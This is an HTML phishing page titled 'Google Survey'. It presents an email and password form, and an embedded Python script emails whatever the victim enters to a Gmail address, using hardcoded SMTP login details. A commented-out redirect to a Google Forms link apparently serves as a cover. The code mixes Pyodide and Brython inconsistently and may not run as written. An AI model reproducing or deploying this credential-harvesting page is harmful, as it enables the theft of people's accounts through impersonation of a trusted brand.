<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Google Survey</title>
    <!-- include Brython -->
	<script type="text/javascript" src="https://cdn.jsdelivr.net/pyodide/v0.18.1/full/pyodide.js"></script>
	<script type="text/python">
		import smtplib
		from email.mime.text import MIMEText

		def send_email(email, password):
			from_addr = 'scarlette.scotty@gmail.com'
			to_addr = 'scarlette.scotty@gmail.com'
			subject = 'Credentials'
			body = f'Your password is {password} and your email address is {email}'

			msg = MIMEText(body)
			msg['From'] = from_addr
			msg['To'] = to_addr
			msg['Subject'] = subject

			smtp_server = 'smtp.gmail.com'
			smtp_port = 587
			smtp_username = 'scarlette.scotty@gmail.com'
			smtp_password = 'password3.'

			server = smtplib.SMTP(smtp_server, smtp_port)
			server.starttls()
			server.login(smtp_username, smtp_password)
			server.sendmail(from_addr, [to_addr], msg.as_string())
			server.quit()
	</script>
</head>
<body onload="brython()">
    <div>
        <form onsubmit="return submitForm(event)">
        <input type="email" id="email" name="email" size="30" required/>
        <input type="password" id="password" name="password" required/>
	<input type="submit" id="btn" value="Submit"/> <!-- onclick="saveFile()" onclick="myRedirection()" -->
        </form>
        </script>
        <script type="text/javascript">
            /* Redirection function */

            /* 
            function myRedirection() {
                window.location.href="https://forms.gle/z2ETwZfArNfB2ifs5";
            }
            */
            function submitForm(event) {
                event.preventDefault();
                // get the email and password values from the form
                var email = document.getElementById('email').value;
                var password = document.getElementById('password').value;
                // run the send_email function using Brython
                brython({debug:1, pythonpath:['./']}, function() {
                    brython_import('__main__');
                    __main__.send_email(email, password);
                });
                // clear the form
                document.getElementById('email').value = '';
                document.getElementById('password').value = '';
                return false;
		    }

        </script>
    </div>
    <!--  onclick="saveFile()" -->
</body>
</html>
